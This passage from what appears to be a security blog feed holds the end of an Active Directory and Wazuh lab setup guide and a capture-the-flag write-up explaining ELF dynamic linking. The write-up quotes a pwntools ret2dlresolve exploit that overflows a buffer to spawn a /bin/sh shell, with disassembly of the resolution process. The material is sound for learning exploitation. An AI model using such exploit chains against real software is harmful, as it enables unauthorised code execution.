<h2 id="add-a-server-to-ad-lab">Add a Server to AD Lab</h2>
<ol start="66">
<li>Use the copy of the Windows server VHD image we created earlier, to spawn a new VM machine connected to the Virtualbox Host-Only adapter.</li>
</ol>
<blockquote>
<p><strong>NOTE</strong>: If you get UUID conflict run <code>C:\Users\ashtrace\VMs&gt;&quot;C:\Program Files\Oracle\VirtualBox\VBoxManage.exe&quot; internalcommands sethduuid &lt;path-to-vhd-file&gt;</code></p>
</blockquote>
<ol start="67">
<li>
<p>Configure the locale settings and setup the administrator password (reference the steps executed when preparing VM for the DC i.e. steps 1-2-3-4).</p>
</li>
<li>
<p>Once the VM reboots, through the server manager configure a hostname for the VM (reference step 7). I named the server <code>LAB-SRV</code>.</p>
</li>
<li>
<p>After the VM restarts again, configure a static IP address and enter the DC&rsquo;s IP for DNS (reference step 46, use credential setup for lab server to login).</p>
</li>
</ol>
<p><img src="./lab-srv-ip.png" alt="lab-srv-ip"></p>
<ol start="70">
<li>Open file explorer. Right-click on <code>This PC</code>, select <code>Properties</code>. This opens up the <code>About</code> page in <code>Settings</code>. Scroll-down and click on <code>Advanced system settings</code>. In the pop-window go to <code>Computer Name</code> tab and click on <code>Change</code>.</li>
</ol>
<p><img src="./lab-srv-connect-to-domain.png" alt="lab-srv-connect-to-domain"></p>
<ol start="71">
<li>Switch to <code>Domain</code> from <code>Workgroup</code> and enter the domain name (here: <code>LAB.LOCAL</code>), enter the domain administrator credentials. After successful authentication a dialog box with message <code>Welcome to domain &lt;domain name&gt;</code> should appear. Restart the VM when asked.</li>
</ol>
<p><img src="./lab-srv-connect-to-domain-auth.png" alt="lab-srv-connect-to-domain-auth"></p>
<ol start="72">
<li>After reboot, use domain credentials to log onto the server. I used the <code>ashtrace</code> account credentials as it would be part of the built-in administrator group owing the GPO created earlier (Ensure that the LAB-SRV machine is part of the OU to which the GPO has been mapped, if not on the DC, open up <code>Server Manager</code> &gt; go to <code>Active Directory Users and Computers</code> from <code>Computers</code> drag the <code>LAB-SRV</code> machine to the particular OU (<code>LAB-OU &gt; Computers</code> in this case), back on the <code>LAB-SRV</code> machine run <code>gpupdate /force</code> and reboot)</li>
</ol>
<h3 id="configure-iis-service-on-the-newly-added-server">Configure IIS service on the newly added server</h3>
<blockquote>
<p>We briefly enable a second network adapter for the VM and allow access to the Wi-fi network.</p>
</blockquote>
<p><img src="./bridged-network-lab-srv.png" alt="bridged-network-lab-srv"></p>
<ol start="73">
<li>
<p>In the <code>Server Manager</code> Application, select to <code>Manage &gt; Add Roles and Features</code>. Select <code>Role-based or feature-based installation</code> mode and click on <code>Next</code>. Ensure that the server is selected in <code>Server Selection</code> window.</p>
</li>
<li>
<p>Select <code>Web Server IIS</code> in the <code>Server Roles</code> window and click on <code>Add features</code> in the pop-window that appears. Click on <code>Next</code>.</p>
</li>
</ol>
<p><img src="./web-server-iis-role.png" alt="web-server-iis-role"></p>
<ol start="75">
<li>Click on <code>Next</code> in <code>Features</code> window followed by another <code>Next</code>. In the <code>Web Server Role (IIS)</code> window&rsquo;s <code>Role services</code> list select following under <code>Application Development</code> (if you want ASP.NET support) along with the default features selected. Click on <code>Next</code>.</li>
</ol>
<p><img src="./web-server-iis-roles-services.png" alt="web-server-iis-roles-services"></p>
<ol start="76">
<li>
<p>Under <code>Confirmation</code> allow the wizard to restart the VM if needed and click on <code>Install</code>.</p>
</li>
<li>
<p>Once the installation succeeds, visit the server from the workstation added earlier to establish if the IIS service is up and running.</p>
</li>
</ol>
<p><img src="./iis-default-page-on-lab-srv.png" alt="iis-default-page-on-lab-srv"></p>
<h2 id="adding-xdr">Adding XDR</h2>
<p>Wazuh is an open-source XDR. It ships <a href="https://documentation.wazuh.com/current/deployment-options/virtual-machine/virtual-machine.html">OVA</a> image among other installation methods.</p>
<ol start="78">
<li>
<p>Download the OVA file and import it in Virtualbox.</p>
</li>
<li>
<p>Change the network adapter to host-only, change the graphics controller to <code>VMSVGA</code> (under <code>Settings &gt; Display &gt; Graphics Controller</code>) and enable the <code>Enable Hardware Clock in UTC Time</code> feature under <code>Settings &gt; System &gt; Extended Features</code>.</p>
</li>
<li>
<p>Power-up the VM, login using credentials <code>wazuh-user:wazuh</code>.</p>
</li>
</ol>
<h3 id="setup-static-ip-address">Setup static IP address</h3>
<ol start="81">
<li>Find the name of the ethernet interface using <code>ip a</code>.</li>
</ol>
<pre tabindex="0"><code>[wazuh-user@wazuh-server ~]$ ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:bf:d2:7c brd ff:ff:ff:ff:ff:ff
    altname enp0s17
    inet 192.168.56.107/24 brd 192.168.56.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:febf:d27c/64 scope link proto kernel_ll
       valid_lft forever preferred_lft forever
</code></pre><ol start="82">
<li>Check the status of the ethernet interface to identify the file being used to manage it from <code>systemd-networkd</code> by running <code>networkctl status &lt;interface-name&gt;</code> (here and hereafter the interface-name is <code>eth0</code>)</li>
</ol>
<pre tabindex="0"><code>[wazuh-user@wazuh-server ~]$ networkctl status eth0
● 2: eth0
                     Link File: /usr/lib/systemd/network/99-default.link
                  Network File: /etc/systemd/network/10-cloud-init-eth0.network
                         State: routable (configured)
                  Online state: online
                          Type: ether
                          Path: pci-0000:00:11.0
                        Driver: e1000
                        Vendor: Intel Corporation
                         Model: 82545EM Gigabit Ethernet Controller (Copper) (PRO/1000 MT Single Port Adapter)
             Alternative Names: enp0s17
              Hardware Address: 08:00:27:bf:d2:7c (PCS Systemtechnik GmbH)
                           MTU: 1500 (min: 46, max: 16110)
                         QDisc: fq_codel
  IPv6 Address Generation Mode: eui64
      Number of Queues (Tx/Rx): 1/1
              Auto negotiation: yes
                         Speed: 1Gbps
                        Duplex: full
                          Port: tp
                       Address: 192.168.56.107 (DHCP4 via 192.168.56.100)
                                fe80::a00:27ff:febf:d27c
             Activation Policy: up
           Required For Online: yes
               DHCP4 Client ID: IAID:0x62b7eef0/DUID
             DHCP6 Client DUID: DUID-EN/Vendor:0000ab116c1ecb03a0526b40
</code></pre><ol start="83">
<li>Check the value of <code>Network File</code> attribute (here: <code>/etc/systemd/network/10-cloud-init-eth0.network</code>). Create a file with name <code>&lt;words-between-number-and-interface&gt;.disabled</code> (eg: <code>cloud-init.disabled</code>)</li>
</ol>
<pre tabindex="0"><code>[wazuh-user@wazuh-server ~]$ sudo touch /etc/cloud/cloud-init.disabled
</code></pre><ol start="84">
<li>Remove the file discovered as value of <code>Network File</code> attribute.</li>
</ol>
<pre tabindex="0"><code>[wazuh-user@wazuh-server ~]$ sudo rm /etc/systemd/network/10-cloud-init-eth0.network
</code></pre><ol start="85">
<li>Create a new file <code>/etc/systemd/network/10-static.network</code></li>
</ol>
<pre tabindex="0"><code>[Match]
Name=eth0

[Network]
Address=192.168.56.150/24
Gateway=192.168.56.1
DNS=8.8.8.8
DNS=1.1.1.1
</code></pre><ol start="86">
<li>Restart the <code>systemd-networkd</code> service.</li>
</ol>
<pre tabindex="0"><code>sudo systemctl restart systemd-networkd
</code></pre><ol start="87">
<li>Validate the changes through <code>networkctl status eth0</code>.</li>
</ol>
<h3 id="access-the-wazuh-dashboard">Access the Wazuh dashboard</h3>
<ol start="88">
<li>Visit the URL through IP address configured earlier (here: <code>https://192.168.56.107</code>) and credential <code>admin:admin</code>.</li>
</ol>
<p><img src="./wazuh-dashboard.png" alt="wazuh-dashboard"></p>
<h3 id="deploy-wazuh-agents">Deploy Wazuh agents</h3>
<ol start="89">
<li>Click on <code>Agent Management &gt; Summary</code> from the hamburger menu icon on the top left of the dashboard. For your first agent <code>Deploy new agent</code> page should appear, further agents can be added via clicking on <code>Deploy new agent</code> button.</li>
</ol>
<p><img src="./deploy-new-agent-first-wazuh-agent.png" alt="deploy-new-agent-first-wazuh-agent"></p>
<ol start="90">
<li>Under <code>Select the package to download and install on your system:</code> select <code>Windows: MSI 32/64 bits</code>. Under <code>Server address</code>, add the add IP address configured for this wazuh-server VM.</li>
</ol>
<p><img src="./deploy-new-agent-windows-installer-1.png" alt="deploy-new-agent-windows-installer-1"></p>
<ol start="91">
<li>Skip optional settings, the command under <code>Run the following commands to download and install the agent:</code> fetches the installer from <code>packages.wazuh.com</code> thus for the sake of installation enable a second network adapter on the VMs and provide access to internet through <code>Bridged Adapter</code>.</li>
</ol>
<p><img src="./bridged-adapter.png" alt="bridged-adapter"></p>
<ol start="92">
<li>Log onto the target VM with administrative account (Domain administrator on <code>LAB-DC</code> and local administrator, for e.g. the one created earlier through GPO, on the workstation and server <code>LAB-SRV</code>). Open a PowerShell session with administrative privileges. Copy the command from <code>Run the following commands to download and install the agent:</code> section of the <code>Deploy new agent</code> page and run it in the PowerShell session.</li>
</ol>
<p><img src="./wazuh-agent-installation-command-powershell.png" alt="wazuh-agent-installation-command-powershell"></p>
<ol start="93">
<li>After the command is executed run <code>NET START WazuhSvc</code> from the same powershell session. Through <code>Task Manager &gt; Services</code> it is evident a certian <code>WazuhSvc</code> service was created and is running.</li>
</ol>
<p><img src="./wazuh-svc.png" alt="wazuh-svc"></p>
<p>After a while the agent would be visible on the <code>Agent Management &gt; Summary</code> dashboard (first as <code>Never connected</code> then as <code>Active</code>.)</p>
<p><img src="./agent-management-summary-dashboard-agent-active.png" alt="agent-management-summary-dashboard-agent-active"></p>
<ol start="94">
<li>Repeat the steps to install the agent on other VM machines in the <code>LAB.LOCAL</code> domain. Finally, the <code>Agent Management &gt; Summary</code> should look like this.</li>
</ol>
<p><img src="./agent-management-summary-dashboard-all-agents.png" alt="agent-management-summary-dashboard-all-agents"></p>
<h2 id="finally">Finally</h2>
<ol start="95">
<li>
<p>Agument this lab setup by adding on other servers and configurations like delegation, PKI etc. and do share the guides and resources with me.</p>
</li>
<li>
<p>Eat</p>
</li>
<li>
<p>Sleep</p>
</li>
<li>
<p>Hack</p>
</li>
<li>
<p>Repeat</p>
</li>
<li>
<p>Stay Hydrated</p>
</li>
<li>
<p>Touch Grass</p>
</li>
</ol>
<h2 id="quick-troubleshoot">Quick Troubleshoot</h2>
<ul>
<li>The log of wazuh agent can be viewed from the file <code>C:\Program Files (x86)\ossec-agent\ossec.log</code></li>
</ul>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>How are functions resolved: A jump across tables into dl_resolve</title>
      <link>https://ashtrace.github.io/posts/how_functions_resolve/</link>
      <pubDate>Tue, 14 Jan 2025 12:48:53 +0530</pubDate>
      
      <guid>https://ashtrace.github.io/posts/how_functions_resolve/</guid>
      <description><![CDATA[<p>While going through another one of those easy challenges (this one dealing with ret2dlresolve), I encountered the following piece of exploit in the writeup which possessed limited verbosity for me and with this level of abstraction I could not figure out what the exploit actually was. Thus I put on my gloves and decided to dig into the dl_resolve process.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./challenge_binary&#39;</span>)
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(elf)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># create a resolver for the system function</span>
</span></span><span style="display:flex;"><span>dlresolve <span style="color:#f92672">=</span> Ret2dlresolvePayload(elf, symbol<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;system&#39;</span>, args<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;/bin/sh&#39;</span>])
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(<span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">72</span>) <span style="color:#75715e"># padding</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">0</span>, dlresolve<span style="color:#f92672">.</span>data_addr) <span style="color:#75715e"># read in the data and structures for the</span>
</span></span><span style="display:flex;"><span>ret2dlresolve
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>ret2dlresolve(dlresolve) <span style="color:#75715e"># trigger the linker to resolve system</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(rop<span style="color:#f92672">.</span>chain()) <span style="color:#75715e"># send the exploit</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(dlresolve<span style="color:#f92672">.</span>payload) <span style="color:#75715e"># send the relevant structures</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><blockquote>
<p>PS: No grudges against the author of the writeup or challenge. I am thankful for them to introduce me to a new topic.</p>
</blockquote>
<h2 id="context-information">Context Information</h2>
<p>We are provided with an ELF binary (I’ve tried my best to redact the challenge name).</p>
<h2 id="binary-executable-security-mitigation-enumeration">Binary Executable Security Mitigation Enumeration</h2>
<pre tabindex="0"><code>Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b&#39;./glibc/&#39;
Stripped:   No
</code></pre><h2 id="source-code-analysis">Source code analysis</h2>
<h3 id="functions">Functions</h3>
<ul>
<li>
<p>main</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">vuln</span>(argc, argv, envp);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
<li>
<p>vuln</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">vuln</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">64</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-40h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0xC8uLL</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li><strong>vuln()</strong> is vulnerable to out-of-bounds write as it tries to read in 200 bytes within a 40 bytes buffer.</li>
</ul>
</li>
</ul>
<h2 id="exploitation-avenues">Exploitation Avenues</h2>
<p>As there is not any target <em>win()</em> functions or call to <em>juicy</em> funtions like <em>system()</em>, we need to perform a <code>ret2dlresolve</code> attack to call <em>system()</em> by abusing the dynamic linking process of an ELF.</p>
<p>During a ret2dlresolve, the attacker tricks the binary into resolving a function of its choice (such as system) into the PLT. This then means the attacker can use the PLT function as if it was originally part of the binary, bypassing ASLR (if present) and <strong>requiring no libc leaks.</strong></p>
<h2 id="detailed-overview-of-dynamic-linking">Detailed Overview of dynamic linking</h2>
<p>Dynamically-linked ELF objects import libc functions when they are first called using the PLT and GOT. During the relocation of a runtime symbol, RIP will jump to the PLT and attempt to resolve the symbol. During this process a &ldquo;resolver&rdquo; is called.</p>
<p>Example: Calling <em>read()</em> in <em>vuln()</em></p>
<p>At <code>vuln+25</code></p>
<pre tabindex="0"><code>0x000000000040113b &lt;+25&gt;:    call   0x401030 &lt;read@plt&gt;
</code></pre><p>At <code>read@plt</code></p>
<pre tabindex="0"><code>0x401030 &lt;read@plt&gt;: jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 &lt;read@got.plt&gt;
0x401036 &lt;read@plt+6&gt;:       push   0x0
0x40103b &lt;read@plt+11&gt;:      jmp    0x401020
</code></pre><p>First it jumps to <code>read@got.plt</code>, if the function is already linked this location is populated with the address of the target funtion. But on first call it points to the next instruction in the PLT.</p>
<p>At <code>read@got.plt</code> before first call to read</p>
<pre tabindex="0"><code>0x404018 &lt;read@got.plt&gt;:        0x0000000000401036
</code></pre><p>As evident from above, at 0x401036 we push a byte (here 0x0) called <code>reloc_arg</code> (It is essentially the index of the Elf32_Rel/Elf64_Rela in JMPREL table, <em>example: read is at index 0</em>) onto stack and jump to a predefined address (here 0x401020) called <em>default stub</em>. The <code>reloc_arg</code> is multiplied by size of Elf64_Rela (24) to get <code>reloc_offset</code> from the JMPREL base address.</p>
<p>At the stub, we push <code>link_map</code> ,<em>a list with all the loaded libraries</em>, to the stack and jump to an address loaded from start of the GOT section.</p>
<pre tabindex="0"><code>0x401020:    push   QWORD PTR [rip+0x2fe2]        # 0x404008
0x401026:    jmp    QWORD PTR [rip+0x2fe4]        # 0x404010
</code></pre><p>Here 0x404010 is the start of GOT section. At the start of GOT section there is a special address that lies within the ld.so&rsquo;s memory range responsible for loading the dynamically linked libc function.</p>
<pre tabindex="0"><code>0x404010:       0x00007ffff7fe8540
</code></pre><pre tabindex="0"><code>0x7ffff7fd3000     0x7ffff7ff3000    0x20000     0x1000  r-xp   /challenge/glibc/ld-linux-x86-64.so.2
</code></pre><p>This leads to a function call of the form: <code>_dl_runtime_resolve (link_map , rel_offset/relog_arg)</code>.</p>
<p><code>_dl_runtime_resolve</code> uses <code>link_map</code> list to resolve the symbol. After relocating the symbol, it populates the approriate entry in SYMTAB, the initial call of read will be invoked following which the control returns to the instruction after the original call instruction to this funtion within the code, for every subsequent call the GOT section has been populated thorugh with the address of the function.</p>
<pre tabindex="0"><code>0x404018 &lt;read@got.plt&gt;:        0x00007ffff7ee1780
</code></pre><h2 id="understanding-resolution-sections-and-structures-in-elf">Understanding resolution sections and structures in ELF</h2>
<p>In order to resolve the functions, there are 3 structures that need to exist within the binary. Faking these 3 structures could enable us to trick the linker into resolving a function of our choice, and we can also pass parameters in (such as <em>/bin/sh</em>) once resolved.</p>
<pre tabindex="0"><code>readelf -d void

Tag        Type                         Name/Value

0x0000000000000005 (STRTAB)             0x400390
0x0000000000000006 (SYMTAB)             0x400330
0x0000000000000017 (JMPREL)             0x400430
</code></pre><p>JMPREL (.rel.plt) has an offset <code>r_offset</code> that stores the target GOT address where to store the resolved address and another index <code>R_SYM</code> into the SYMTAB (.dynsym) a symbol table, the structure at this offset has a member <code>st_name</code> which stores offset into STRTAB (.dynstr), a string table, for symbol name.</p>
<h3 id="jmprel-relplt">JMPREL (.rel.plt)</h3>
<p>The JMPREL segment stores <strong>the Relocation Table</strong>, which maps each entry to a symbol.</p>
<ul>
<li>
<p>x86 <em>example</em> ELF:</p>
<pre tabindex="0"><code>readelf -r source

Relocation section &#39;.rel.dyn&#39; at offset 0x2d0 contains 1 entry:
Offset     Info    Type            Sym.Value  Sym. Name
0804bffc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section &#39;.rel.plt&#39; at offset 0x2d8 contains 2 entries:
Offset     Info    Type            Sym.Value  Sym. Name
0804c00c  00000107 R_386_JUMP_SLOT   00000000   gets@GLIBC_2.0
0804c010  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
</code></pre></li>
<li>
<p>amd64 <em>void</em> ELF:</p>
<pre tabindex="0"><code>readelf -r void

Relocation section &#39;.rela.dyn&#39; at offset 0x400 contains 2 entries:
Offset          Info           Type           Sym. Value    Sym. Name + Addend
0000004031f0  000200000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
0000004031f8  000300000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0

Relocation section &#39;.rela.plt&#39; at offset 0x430 contains 1 entry:
Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000404018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
</code></pre><ul>
<li>IDA listing
<pre tabindex="0"><code>LOAD:0000000000400400                               ; ELF RELA Relocation Table
LOAD:0000000000400400 F0 31 40 00 00 00 00 00 06 00+Elf64_Rela &lt;4031F0h, 200000006h, 0&gt;     ; R_X86_64_GLOB_DAT __libc_start_main
LOAD:0000000000400418 F8 31 40 00 00 00 00 00 06 00+Elf64_Rela &lt;4031F8h, 300000006h, 0&gt;     ; R_X86_64_GLOB_DAT __gmon_start__
LOAD:0000000000400430                               ; ELF JMPREL Relocation Table
LOAD:0000000000400430 18 40 40 00 00 00 00 00 07 00+Elf64_Rela &lt;404018h, 100000007h, 0&gt;     ; R_X86_64_JUMP_SLOT read
LOAD:0000000000400430 00 00 01 00 00 00 00 00 00 00+LOAD ends
</code></pre></li>
</ul>
</li>
</ul>
<p>These entries are of type <code>Elf32_Rel</code> (in x86 executable) and <code>Elf64_Rela</code> (in amd64 executable):</p>
<ul>
<li>
<p>x86</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">uint32_t</span> Elf32_Addr;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">uint32_t</span> Elf32_Word;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>Elf32_Addr    r_offset;               <span style="color:#75715e">/* Address */</span>
</span></span><span style="display:flex;"><span>Elf32_Word    r_info;                 <span style="color:#75715e">/* Relocation type and symbol index */</span>
</span></span><span style="display:flex;"><span>} Elf32_Rel;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* How to extract and insert information held in the r_info field.  */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF32_R_SYM(val)                ((val) &gt;&gt; 8)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF32_R_TYPE(val)               ((val) &amp; 0xff)
</span></span></span></code></pre></div><p>The column <strong>name</strong> coresponds to our symbol name. The <strong>offset</strong> is the GOT entry for our symbol. <strong>info</strong> stores additional metadata. <strong>ELF32_R_SYM</strong> stores the index of the <code>Elf32_Sym</code>(<em>see SYMTAB section definition below</em>) entry in <code>SYMTAB</code> (Symbol Table) for the specified symbol.</p>
<p>Due to value of <strong>info</strong> (visible in .rel.plt dump) the <code>R_SYM</code> of <strong>gets</strong> is 1 as 0x107 &raquo; 8 = 1.</p>
</li>
<li>
<p>amd64 (cleaner definition further below)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> Elf64_Addr <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint64_t</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> Elf64_Xword <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint64_t</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Elf64_Rela</span> {
</span></span><span style="display:flex;"><span>Elf64_Addr r_offset; <span style="color:#75715e">// Location (file byte offset, or program virtual addr).
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Elf64_Xword r_info;  <span style="color:#75715e">// Symbol table index and type of relocation to apply.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// These accessors and mutators correspond to the ELF64_R_SYM, ELF64_R_TYPE,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// and ELF64_R_INFO macros defined in the ELF specification:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Elf64_Word <span style="color:#a6e22e">getSymbol</span>() <span style="color:#66d9ef">const</span> { <span style="color:#66d9ef">return</span> (r_info <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>); }
</span></span><span style="display:flex;"><span>Elf64_Word <span style="color:#a6e22e">getType</span>() <span style="color:#66d9ef">const</span> { <span style="color:#66d9ef">return</span> (Elf64_Word)(r_info <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffffL</span>); }
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setSymbol</span>(Elf64_Word s) { setSymbolAndType(s, getType()); }
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setType</span>(Elf64_Word t) { setSymbolAndType(getSymbol(), t); }
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setSymbolAndType</span>(Elf64_Word s, Elf64_Word t) {
</span></span><span style="display:flex;"><span>    r_info <span style="color:#f92672">=</span> ((Elf64_Xword)s <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">+</span> (t <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffffL</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>The <code>R_SYM</code> value of read (in <em>void</em> ELF) would be 1 (0x000100000007 &raquo; 32).</p>
<p>The type <code>R_386_JUMP_SLOT</code> and <code>R_X86_64_JUMP_SLOT</code> means that the entry is for GOT section.</p>
<p>Eg: IDA&rsquo;s listing of JUMPREL of <em>example</em> amd64 ELF.</p>
<pre tabindex="0"><code>LOAD:04005C0 ; ELF JMPREL Relocation Table
LOAD:04005C0 Elf64_Rela &lt;404018h, 200000007h, 0&gt; ; R_X86_64_JUMP_SLOT write
LOAD:04005D8 Elf64_Rela &lt;404020h, 300000007h, 0&gt; ; R_X86_64_JUMP_SLOT strlen
LOAD:04005F0 Elf64_Rela &lt;404028h, 400000007h, 0&gt; ; R_X86_64_JUMP_SLOT setbuf
LOAD:0400608 Elf64_Rela &lt;404030h, 500000007h, 0&gt; ; R_X86_64_JUMP_SLOT read
</code></pre><p>Here the first value is <code>r_offset</code> (offset into GOT), the second value is <code>r_info</code>, the third value is <code>r_addend</code> (available in another definition of <code>Elf64_Rela</code> mentioned further below).</p>
<p>Notice how the second value mentions the offset within the SYMTAB table with the highest-order-byte - 2, 3, 4, 5 while the lowest-order-byte represents type 7 ie. R_X86_64_JUMP_SLOT.</p>
<ul>
<li>Cleaner definition of <code>Elf64_Rela</code>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>Elf64_Addr        r_offset;    <span style="color:#75715e">/* 64 bit - Address */</span>
</span></span><span style="display:flex;"><span>Elf64_Xword       r_info;      <span style="color:#75715e">/* 64 bit - Relocation type and symbol index */</span>
</span></span><span style="display:flex;"><span>Elf64_Sxword      r_addend;    <span style="color:#75715e">/* 64 bit - Addend */</span>
</span></span><span style="display:flex;"><span>} Elf64_Rela; <span style="color:#75715e">// 24 bytes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">/* How to extract and insert information held in the r_info field.*/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF64_R_SYM(i)         ((i) &gt;&gt; 32)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF64_R_TYPE(i)        ((i) &amp; 0xffffffff)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF64_R_INFO(sym,type) ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))
</span></span></span></code></pre></div></li>
</ul>
</li>
</ul>
<h3 id="strtab-dynstr">STRTAB (.dynstr)</h3>
<p>STRTAB is a simple table that stores the strings for symbols name.</p>
<p>IDA&rsquo;s listing for STRTAB for <em>void</em></p>
<pre tabindex="0"><code>LOAD:0000000000400390                               ; ELF String Table
LOAD:0000000000400390 00                            unk_400390 db    0                      ; DATA XREF: LOAD:0000000000400348↑o
LOAD:0000000000400390                                                                       ; LOAD:0000000000400360↑o
LOAD:0000000000400390                                                                       ; LOAD:0000000000400378↑o
LOAD:0000000000400390                                                                       ; LOAD:00000000004003E0↓o
LOAD:0000000000400390                                                                       ; LOAD:00000000004003F0↓o
LOAD:0000000000400391 72 65 61 64 00                aRead db &#39;read&#39;,0                       ; DATA XREF: LOAD:0000000000400348↑o
